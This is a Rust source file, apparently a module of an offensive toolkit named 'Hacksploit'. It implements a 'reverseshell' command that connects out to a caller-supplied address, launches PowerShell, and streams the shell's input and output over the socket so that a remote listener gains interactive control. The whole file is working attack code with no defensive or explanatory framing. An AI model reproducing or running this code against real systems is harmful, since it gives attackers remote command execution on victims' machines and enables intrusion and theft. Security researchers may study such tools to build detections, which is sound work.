use crate::HacksploitModule;
use std::{
    io::Error,
    process::{Command, Stdio},
};
use std::{io::Read, net::TcpStream};
use std::{io::Write, thread::spawn};

pub struct ReverseShellModule {}

impl ReverseShellModule {
    pub fn new() -> Self {
        ReverseShellModule {}
    }
}

impl HacksploitModule for ReverseShellModule {
    fn on_command(&self, args: Vec<&str>) -> String {
        let addr = args.get(0);
        if addr.is_none() {
            return String::from("Usage - reverseshell <addr>\n");
        }
        let addr = addr.unwrap();
        let s: &str = match spawn_reverse_shell(addr) {
            Ok(_) => "Successfully spawned reverse shell.\n",
            Err(_) => {
                "There was an error, please make sure a listener is listening on that address.\n"
            }
        };
        String::from(s)
    }
    fn get_name(&self) -> String {
        String::from("reverseshell")
    }
    fn get_description(&self) -> String {
        String::from("(Usage: reverseshell <addr>) - Spawns a reverse shell at the listener")
    }
}

fn spawn_reverse_shell(addr: &str) -> Result<(), Error> {
    let stream = TcpStream::connect(addr)?;
    let process = Command::new("powershell")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let stdin = process.stdin;
    let stdout = process.stdout;
    let stderr = process.stderr;

    if stdin.is_none() || stdout.is_none() || stderr.is_none() {
        return Ok(());
    }

    pipe_stream(stdout.unwrap(), stream.try_clone()?);
    pipe_stream(stderr.unwrap(), stream.try_clone()?);
    pipe_stream(stream.try_clone()?, stdin.unwrap());

    Ok(())
}

fn pipe_stream<R, W>(mut read: R, mut write: W)
where
    R: Read + Send + 'static,
    W: Write + Send + 'static,
{
    spawn(move || loop {
        let mut buf = [0; 1024];
        match read.read(&mut buf) {
            Ok(len) => {
                if len == 0 {
                    break;
                }
                match write.write(&buf[..len]) {
                    Ok(_) => match write.flush() {
                        Ok(_) => (),
                        Err(_) => break,
                    },
                    Err(_) => break,
                }
            }
            Err(_) => break,
        }
    });
}
